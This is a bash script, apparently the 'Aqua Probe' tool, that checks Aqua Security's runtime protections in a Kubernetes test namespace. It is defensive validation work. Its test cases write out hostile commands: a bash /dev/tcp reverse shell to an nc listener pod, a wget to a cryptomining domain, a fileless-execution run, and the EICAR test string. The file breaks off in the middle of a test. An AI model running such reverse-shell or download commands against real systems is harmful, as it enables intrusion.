#!/bin/bash

# Brand palette from aquasec.com: ink-deep, electric-blue, teal, and text-muted.
# Keep background/color resets on every row so the shell retains its own theme.
theme_code() {
    local tone="$1"
    if [[ "${COLORTERM:-}" == truecolor || "${COLORTERM:-}" == 24bit ]]; then
        case "$tone" in
            blue) printf '1;38;2;72;145;249' ;;
            cyan|teal|green) printf '1;38;2;0;224;199' ;;
            red) printf '1;38;2;255;0;73' ;;
            yellow) printf '1;38;2;255;251;113' ;;
            muted) printf '0;38;2;147;164;190' ;;
            *) printf '0;38;2;230;237;247' ;;
        esac
        printf ';48;2;1;15;31'
    else
        case "$tone" in
            blue) printf '1;34' ;; cyan|teal|green) printf '1;36' ;;
            red) printf '1;31' ;; yellow) printf '1;33' ;;
            muted) printf '0;37' ;; *) printf '1;37' ;;
        esac
        printf ';40'
    fi
}

print_banner_row() {
    local text="$1" tone="${2:-text}" block_width="${3:-0}"
    local width padding row code
    width=$(instruction_width)
    (( block_width > 0 )) || block_width=${#text}
    padding=$(( (width - block_width) / 2 ))
    (( padding >= 0 )) || padding=0
    printf -v row '%*s%s' "$padding" '' "$text"
    printf -v row '%-*s' "$width" "$row"
    if [[ -t 1 && -z "${NO_COLOR+x}" && "${TERM:-}" != dumb ]]; then
        code=$(theme_code "$tone")
        printf '\033[%sm%s\033[0m\n' "$code" "$row"
    else
        printf '%s\n' "${row%"${row##*[! ]}"}"
    fi
}

print_banner_text() {
    local line width
    width=$(instruction_width)
    while IFS= read -r line; do
        line="${line%"${line##*[! ]}"}"
        print_banner_row "$line" "${2:-text}"
    done < <(printf '%s\n' "$1" | fold -s -w "$((width - 4))")
}

print_banner_rule() {
    local rule width
    width=$(instruction_width)
    printf -v rule '%*s' "$((width - 4))" ''
    print_banner_row "${rule// /-}" teal
}

print_logo() {
    local line width
    width=$(instruction_width)
    echo
    print_banner_rule
    print_banner_row ''
    # ASCII silhouettes derived from aquasec-icon-dark.png and aquasec-logo-.ai.
    if (( width >= 79 )); then
        while IFS= read -r line; do
            print_banner_row "$line" blue 79
        done <<'AQUA_LOGO'
   ++######++       +####+   +####+  ##    ##  +####+  +######  +####+   +####+
 +############+    +##++### +##++##+ ##    ## +##++##+ ##+++++ +##++##+ +##++#+
+####+    +####+   ##    ##+##    ##+##    ##+##    ## #####+  ########+##
####+      +####   ##+   ##+##+   ##+##+   ## ##+   ##  +++### ######++ ##
####+       ####   +####### +#### ## +######+ +####### +###### +##++#+  +#####+
+####+     +####     +#####   +##+##+  +##++    +##### +#####    +###+    +##++
 +##############                  ##+
   ++###########                  ##+
AQUA_LOGO
    else
        while IFS= read -r line; do
            print_banner_row "$line" blue 16
        done <<'AQUA_ICON'
   ++######++
 +############+
+####+    +####+
####+      +####
####+       ####
+####+     +####
 +##############
   ++###########
AQUA_ICON
        print_banner_row ''
        print_banner_row "aquasec" blue
    fi
    print_banner_row ''
    print_banner_row "A Q U A   P R O B E" teal
    print_banner_row ''
    print_banner_text "Tool developed by Eric Gomes" muted
    print_banner_text "Senior DevSecOps Architect @ Aqua Security" muted
    print_banner_row ''
}


print_welcome_message() {
    print_banner_rule
    print_banner_row ''
    print_banner_text "Welcome to Aqua Probe" teal
    print_banner_text "The Aqua Security Runtime Input Validator Tool"
    print_banner_row ''
    print_banner_text "Explore Aqua Security's runtime security features." muted
    print_banner_text "Real-time Malware Protection, Drift Prevention, and more." muted
    print_banner_row ''
    print_banner_rule
    echo
}

#
# Flags management
#
print_help() {
  echo "Usage: aqua-probe.sh [OPTIONS]"
  echo
  echo "Options:"
  echo "  --daemonset <value>, -d <value>         Set the custom daemonset name where the Aqua Enforcer is deployed (default: aqua-agent,kube-enforcer-ds)"
  echo "  --help, -h                              Show this help message and exit"
  echo "  --image <value>, -i <value>             Set the Aqua Probe test image name (default: ericgomes56/aqua-probe:2.0)"
  echo "  --namespace <value>, -ns <value>        Set the custom namespace where the Aqua Enforcer is deployed (default: aqua)"
  echo "  --no-instructions, -n                   Skip prerequisites instructions"
  echo "  --host-runtime                         Open Host Runtime controls without Kubernetes checks"
  echo "  --version, -v                           Show the current Aqua Probe build version"
  echo
  echo
}

handle_flags() {
  export AQUA_PROBE_IMAGE="ericgomes56/aqua-probe:2.0"
  export AQUA_PROBE_NAMESPACE="aqua"
  export AQUA_PROBE_TEST_NAMESPACE="aqua-probe-lab"
  AQUA_PROBE_HOST_RUNTIME=0

  while [[ $# -gt 0 ]]; do  # Loop until all arguments are processed
    case "$1" in
      --host-runtime)
        AQUA_PROBE_HOST_RUNTIME=1
        shift
        ;;
    # Help flag 
      --help | -h)
        print_help
        exit 0
        ;;
    # Version flag
      --version | -v)
        echo
        echo "Version Build Date: 22 June 2026"
        echo
        shift  # Shift to the next argument
        ;;
    # Custom image flag
      --image | -i)
        shift   # Shift to the next argument (the image name)
        if [[ $# -gt 0 ]]; then  # Ensure an image name is provided
          image_arg="$1"  # Store the image name
          echo "Detected --image flag with argument: $image_arg"
          export AQUA_PROBE_IMAGE=$image_arg
          shift   # Shift again to consume the image name
        else
          echo "Error: --image flag requires an argument" >&2
          exit 1
        fi
        ;;
    # No instructions flag
      --no-instructions | -n)
        export AQUA_PROBE_SKIP_INSTRUCTIONS=1
        echo "Detected --no-instructions flag"
        shift   # Shift to the next argument
        ;;
    # Custom Aqua Enforcer namespace flag
      --namespace | -ns)
        shift  # Shift to the next argument (the namespace value)
        if [[ $# -gt 0 ]]; then  # Ensure a namespace value is provided
          namespace_arg="$1"  # Store the namespace value
          echo "Detected --namespace flag with argument: $namespace_arg"
          export AQUA_PROBE_NAMESPACE=$namespace_arg
          shift  # Shift again to consume the namespace value
        else
          echo "Error: --namespace flag requires an argument" >&2
          exit 1
        fi
        ;;
    # Custom daemonset name flag
      --daemonset | -ds)
        shift  # Shift to the next argument (the daemonset value)
        if [[ $# -gt 0 ]]; then  # Ensure a daemonset value is provided
          daemonset_arg="$1"  # Store the daemonset value
          echo "Detected --daemonset flag with argument: $daemonset_arg"
          export AQUA_PROBE_DAEMONSET=$daemonset_arg
          shift  # Shift again to consume the daemonset value
        else
          echo "Error: --daemonset flag requires an argument" >&2
          exit 1
        fi
        ;;
      *)
        echo "Unknown flag: $1" >&2  # Print to standard error
        shift   # Shift to the next argument
        ;;
    esac
  done
}

print_colored_message() {
    local color="$1"
    local message="$2"
    local code line width
    width=$(instruction_width)
    if [[ -t 1 && -z "${NO_COLOR+x}" && "${TERM:-}" != dumb ]]; then
        code=$(theme_code "$color")
        while IFS= read -r line; do
            printf '\033[%sm%-*s\033[0m\n' "$code" "$width" "$line"
        done < <(printf '%s\n' "$message" | fold -s -w "$width")
    else
        printf '%s\n' "$message"
    fi
}

instruction_width() {
    local width="${COLUMNS:-80}"
    [[ "$width" =~ ^[1-9][0-9]{1,2}$ ]] || width=80
    (( width < 30 )) && width=30
    (( width > 100 )) && width=100
    printf '%s' "$width"
}

print_test_header() {
    local title="$1" scope="${2:-Container Runtime Policy}"
    echo
    print_banner_rule
    print_banner_text "AQUA PROBE" teal
    print_banner_text "$title" blue
    print_banner_text "$scope" muted
    print_banner_rule
    echo
}

print_instructions() {
    local line width
    width=$(instruction_width)
    print_colored_message yellow "BEFORE YOU BEGIN"
    while IFS= read -r line || [[ -n "$line" ]]; do
        line="${line#"${line%%[![:space:]]*}"}"
        [[ -n "$line" ]] || continue
        while IFS= read -r line; do
            print_colored_message text "  $line"
        done < <(printf '%s\n' "$line" | fold -s -w "$((width - 2))")
    done <<< "$1"
    echo
}

format_prompt() {
    if [[ -t 2 && -z "${NO_COLOR+x}" && "${TERM:-}" != dumb ]]; then
        printf '\033[%sm> %s\033[0m' "$(theme_code teal)" "$1"
    else
        printf '> %s' "$1"
    fi
}

print_audit_review() {
    echo
    print_colored_message green "REVIEW IN AQUA"
    print_colored_message blue '  Security Reports -> Audit'
    print_colored_message text '  Review the event, effective policy, and affected workload.'
}

print_menu_option() {
    local number="$1" label="$2" tone="${3:-text}" line prefix width
    width=$(instruction_width)
    printf -v prefix ' %2s. ' "$number"
    while IFS= read -r line; do
        print_colored_message "$tone" "$prefix$line"
        prefix='     '
    done < <(printf '%s\n' "$label" | fold -s -w "$((width - 5))")
}

print_startup_check() {
    local state="$1" step="$2" title="$3" detail="$4" tone label
    case "$state" in
        CHECK) tone=blue ;; PASS) tone=teal ;; FAIL) tone=red ;;
    esac
    printf -v label '  %-7s %s / 03  %s' "[$state]" "$step" "$title"
    print_colored_message "$tone" "$label"
    [[ -z "$detail" ]] || print_colored_message muted "         $detail"
}

check_kubernetes_connection() {
    print_startup_check CHECK 01 'Kubernetes connection' 'Contacting the configured cluster'
    if kubectl cluster-info &>/dev/null; then
        print_startup_check PASS 01 'Kubernetes connection' 'Cluster API is reachable'
        echo
    else
        print_startup_check FAIL 01 'Kubernetes connection' 'Check kubeconfig, credentials, and cluster reachability'
        exit 1
    fi
}

check_aqua_agent_daemonset() {
    local name
    print_startup_check CHECK 02 'Aqua Enforcer' "DaemonSet discovery | namespace: $AQUA_PROBE_NAMESPACE"
    for name in aqua-agent aqua-enforcer-ds kube-enforcer-ds "${AQUA_PROBE_DAEMONSET:-}"; do
        [[ -n "$name" ]] || continue
        if kubectl get daemonset -n "$AQUA_PROBE_NAMESPACE" "$name" &>/dev/null; then
            print_startup_check PASS 02 'Aqua Enforcer' "Found DaemonSet: $name"
            echo
            return 0
        fi
    done
    print_startup_check FAIL 02 'Aqua Enforcer' 'DaemonSet not found or inaccessible; check installation and permissions'
    exit 1
}

check_aqua_kube_enforcer_deployment() {
    print_startup_check CHECK 03 'Aqua Kube-Enforcer' "Deployment: aqua-kube-enforcer | namespace: $AQUA_PROBE_NAMESPACE"
    if kubectl get deployment -n "$AQUA_PROBE_NAMESPACE" aqua-kube-enforcer &>/dev/null; then
        print_startup_check PASS 03 'Aqua Kube-Enforcer' 'Deployment found: aqua-kube-enforcer'
        echo
    else
        print_startup_check FAIL 03 'Aqua Kube-Enforcer' 'Deployment not found or inaccessible; check installation and permissions'
        exit 1
    fi
}

#
# Test container management
#

check_container_existence() {
    # Check if the aqua-test-container deployment already exists
    kubectl get deployment aqua-test-container -n "$AQUA_PROBE_TEST_NAMESPACE" >/dev/null 2>&1
    return $?
}

check_pod_status() {
    local pod_name=$1
    kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" | grep $pod_name | grep -q "Running"
}

ensure_test_namespace() {
    kubectl create namespace "$AQUA_PROBE_TEST_NAMESPACE" --dry-run=client -o yaml | kubectl apply -f -
}

prompt_for_test_image() {
    local prompt_message="$1"
    local default_image="${AQUA_PROBE_IMAGE:-ericgomes56/aqua-probe:2.0}"
    local selected_image

    format_prompt "$prompt_message [default: $default_image]: " >&2
    read selected_image

    if [ -z "$selected_image" ]; then
        selected_image="$default_image"
    fi

    printf "%s" "$selected_image"
}

deploy_test_container() {
    local test_container_image

    # Check if the aqua-test-container deployment already exists
    if check_container_existence; then
        echo "Aqua test container already exists. Redeploying..."
        delete_test_container
    fi

    echo
    print_colored_message yellow "Deploying Aqua test container..."
    test_container_image=$(prompt_for_test_image "Enter image to deploy for the Aqua test container")
    ensure_test_namespace
    # Deploying the container using kubectl
    kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: aqua-test-container
spec:
  replicas: 1
  selector:
    matchLabels:
      app: aqua-test-container
  template:
    metadata:
      labels:
        app: aqua-test-container
    spec:
      containers:
      - name: aqua-probe
        image: $test_container_image
        imagePullPolicy: Always
        command:
        - sleep
        args:
        - infinity
EOF

    # Wait for the deployment to complete
    echo
    print_colored_message yellow "Waiting for the deployment to complete..."
    kubectl wait --for=condition=available deployment/aqua-test-container -n "$AQUA_PROBE_TEST_NAMESPACE" --timeout=60s

    # Check if deployment was successful
    if [ $? -eq 0 ]; then
        echo
        print_colored_message green "✓ Aqua test container deployed successfully."
        echo
    else
        print_colored_message red " Failed to deploy Aqua test container."
        echo
    fi
}

delete_test_container() {
    echo "Deleting Aqua test container..."
    kubectl delete deployment aqua-test-container -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
}

check_listener_container_existence() {
    # Check if the listener container exists
    kubectl get pod listener -n "$AQUA_PROBE_TEST_NAMESPACE" >/dev/null 2>&1
    return $?
}

delete_listener_container() {
    if check_listener_container_existence; then
        echo "Deleting listener container..."
        kubectl delete pod listener -n "$AQUA_PROBE_TEST_NAMESPACE" --force --ignore-not-found
    fi
}

cleanup_aqua_probe_artifacts() {
    local privilege_test_pods=(
        host-network-test cap-add-test root-user-test privileged-test
        host-ipc-test host-pid-test host-userns-test host-uts-test
    )
    local standalone_test_pods=(listener volume-block-test)
    local test_deployments=(
        aqua-test-container aqua-non-compliant-image-test aqua-unregistered-image-test
        mars-banking-app
    )

    echo
    print_colored_message yellow "Cleaning up Aqua Probe Kubernetes test artifacts..."
    kubectl delete pod -l aqua-probe-control=dedicated -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found

    kubectl delete deployment "${test_deployments[@]}" -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
    kubectl delete pod "${standalone_test_pods[@]}" -n "$AQUA_PROBE_TEST_NAMESPACE" --force --ignore-not-found
    kubectl delete pod "${privilege_test_pods[@]}" -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
    kubectl delete service mars-banking-app-lb -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
    kubectl delete secret openai-api-key -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found

    cleanup_non_compliant_resources_lab

    if command -v docker >/dev/null 2>&1; then
        echo
        print_colored_message yellow "Cleaning up Aqua Probe test artifacts..."
        docker rm -f aqua-non-k8s-container >/dev/null 2>&1 || true
    fi
}

apply_non_compliant_resource() {
    local resource_name="$1"

    echo
    print_colored_message yellow "Applying non-compliant resource: $resource_name"
    kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f -
}

cleanup_non_compliant_resources_lab() {
    local lab_namespace="$AQUA_PROBE_TEST_NAMESPACE"
    local lab_pods=(
        host-ipc-bad host-pid-bad host-network-bad host-port-bad
        non-compliant-image-domain-bad cpu-limit-missing-bad cpu-request-missing-bad
        allow-privilege-escalation-bad caps-not-drop-all-bad caps-drop-none-bad
        latest-tag-bad disallowed-hostpath-bad hostaliases-bad
        memory-limit-missing-bad memory-request-missing-bad net-raw-bad
        proc-mount-unmasked-bad privileged-port-bad privileged-bad writable-rootfs-bad
        runs-as-root-bad low-gid-bad low-uid-bad apparmor-unconfined-bad
        seccomp-unconfined-bad selinux-custom-bad sys-admin-bad sys-module-bad
        specific-capability-bad unsafe-sysctl-bad docker-sock-hostpath-bad
        hostpath-volume-bad default-namespace-bad
    )
    local lab_configmaps=(configmap-secret-bad configmap-sensitive-bad)
    local lab_services=(external-ip-bad)
    local lab_roles=(
        delete-pod-logs-bad pod-exec-bad workload-manager-bad namespace-admin-bad
        namespace-secret-manager-bad
    )
    local cluster_role_bindings=(anonymous-view-bad user-admin-access-bad)
    local cluster_roles=(
        rbac-manager-bad networking-manager-bad manage-all-resources-bad
        cluster-secret-manager-bad webhookconfig-manager-bad
    )

    echo
    print_colored_message yellow "Cleaning up non-compliant resource test artifacts..."

    if kubectl get namespace "$lab_namespace" >/dev/null 2>&1; then
        kubectl delete pod "${lab_pods[@]}" -n "$lab_namespace" --ignore-not-found
        kubectl delete configmap "${lab_configmaps[@]}" -n "$lab_namespace" --ignore-not-found
        kubectl delete service "${lab_services[@]}" -n "$lab_namespace" --ignore-not-found
        kubectl delete role "${lab_roles[@]}" -n "$lab_namespace" --ignore-not-found
    fi
    kubectl delete clusterrolebinding "${cluster_role_bindings[@]}" --ignore-not-found
    kubectl delete clusterrole "${cluster_roles[@]}" --ignore-not-found
    kubectl delete namespace "$lab_namespace" --ignore-not-found --wait=false
}

#
# Runtime Test Cases
#

# Real-time Malware Protection 
test_realtime_malware_protection() {
    print_test_header "Real-time Malware Protection"
  # Split and concatenate the EICAR string (done at the start for consistency)
  string1='X5O!P%@AP[4\PZX54(P^)'
  string2='7CC)7}$EICAR-STANDARD'
  string3='-ANTIVIRUS-TEST-FILE!$H+H*'
  eicar_string="$string1$string2$string3"

  if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
    prerequisites_met="Y"
  else
    # Ask user if prerequisites are met
    echo
    print_instructions "
    1. Create a Custom Policy with Real-time Malware Protection Control enabled
    2. Ensure that the Real-time Malware Protection Control is set to 'Delete' action
    3. Ensure that the Custom Policy is set to 'Enforce' mode
    4. Ensure that Block Container Exec Control is disabled"

    echo
    read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
  fi

  case $prerequisites_met in
    [Yy]*)
      if check_container_existence; then
        pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
        container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
        echo
        print_colored_message yellow "Executing 'ls -la' command in the container..."
        echo
        kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- ls -la /tmp/
        sleep 1.5

        # Create the eicar.txt file and write the concatenated string
        echo
        print_colored_message yellow "Creating and writing EICAR string to eicar.txt in the container..."
        echo
        kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c "touch /tmp/eicar.txt && echo '$eicar_string' > /tmp/eicar.txt"
        if [ $? -eq 0 ]; then
          echo
          print_colored_message yellow "Eicar string written to file successfully."
        else
          echo
          print_colored_message red "Failed to write Eicar string to file."
        fi
        
        sleep 1.5
        echo
        print_colored_message yellow "Executing 'ls -la' command again in the container..."
        echo
        print_colored_message yellow "[!] Observe in the output below that the downloaded eicar file is not in sight because it has been deleted by Aqua."
        echo
        kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- ls -la /tmp/
        echo
        print_audit_review

      else  
        print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
      fi
      ;;

    [Nn]*)
      echo "Please ensure the prerequisites are met before proceeding."
      ;;
    *)
      echo "Invalid input. Please enter 'y' for yes or 'n' for no."
      ;;
  esac
}


# Drift Prevention
test_drift_prevention() {
    print_test_header "Drift Prevention"
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Create a Custom Policy with Drift Prevention Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Make a copy of /bin/wget and execute the copy
            if check_container_existence; then
                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Copying '/bin/wget' to '/tmp/wget_copy' in the container..."
                echo
                echo "kubectl exec -n $AQUA_PROBE_TEST_NAMESPACE -it $pod_name --container $container_name -- cp /bin/wget /tmp/wget_copy"
                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- cp /bin/wget /tmp/wget_copy
                echo
                print_colored_message yellow "Executing '/tmp/wget_copy' command in the container..."
                echo
                echo "kubectl exec -n $AQUA_PROBE_TEST_NAMESPACE -it $pod_name --container $container_name -- /tmp/wget_copy google.com"
                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- /tmp/wget_copy google.com
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_audit_review
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Cryptomining
test_block_cryptocurrency_mining() {
    print_test_header "Block Cryptocurrency Mining"
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Create a Custom Policy with Block Cryptocurrency Mining Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing 'wget http://crypto-loot.com' command in the container..."
                echo
                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- wget http://crypto-loot.com
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_audit_review
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Fileless Exec
test_block_fileless_execution() {
    print_test_header "Block Fileless Execution"
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Create a Custom Policy with Block Fileless Execution Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing './memrun MASTER_HACKER_PROCESS_NAME_1337 target' command in the container..."
                echo
                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- ./tmp/memrun MASTER_HACKER_PROCESS_NAME_1337 /tmp/target
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_audit_review
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Reverse Shell
test_reverse_shell() {
    print_test_header "Block Reverse Shell"
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Create a Custom Policy with Reverse Shell Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                # Create a listener pod with nc listener
                echo
                print_colored_message yellow "Creating listener pod"
                listener_image=$(prompt_for_test_image "Enter image to deploy for the reverse shell listener pod")
                ensure_test_namespace
                kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: listener
  labels:
    run: listener
spec:
  containers:
  - name: listener
    image: $listener_image
    imagePullPolicy: Always
    command:
    - sleep
    args:
    - infinity
EOF
                echo
                print_colored_message yellow "Waiting for the listener container pod to start running..."
                while ! kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" | grep listener | grep -q "Running"; do
                    sleep 5
                done
                echo
                print_colored_message yellow "Listener container pod is running. Configuring nc listener in pod..."
                echo
                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" listener -- bash -c "nohup nc -l -p 12345 >/dev/null 2>&1 &" 
                echo
                print_colored_message yellow "Retrieving IP address..."
                listener_pod_ip=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -o wide | grep listener | awk '{print $6}')
                echo "$listener_pod_ip"
                echo
                print_colored_message yellow "Executing reverse shell from Aqua test container to listener container..."
                echo
                aqua_test_container=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $aqua_test_container -- bash -c "exec id &>/dev/tcp/$listener_pod_ip/12345 <&1"
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua".
                echo
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Executables Blocked
test_executables_blocked() {
    print_test_header "Executables Blocked"
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Create a Custom Policy with Executables Block Control enabled
        2. Add 'ps' to the list of blocked executables 
        3. Ensure that the Custom Policy is set to 'Enforce' mode
        4. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing the blocked 'ps' command in the container..."
                echo
                echo "kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c ps"
                echo
                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c "ps"
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_audit_review
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Container Exec
test_block_container_exec() {
    print_test_header "Block Container Exec"
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Create a Custom Policy with Block Container Exec Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode"
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo "Executing shell session in the Aqua test application container..."
                echo
        kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_audit_review
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Bad DNS/IP Reputation
test_bad_dns_ip_reputation() {
    print_test_header "Bad DNS/IP Reputation"
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Create a Custom Policy with Bad DNS/IP Reputation Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
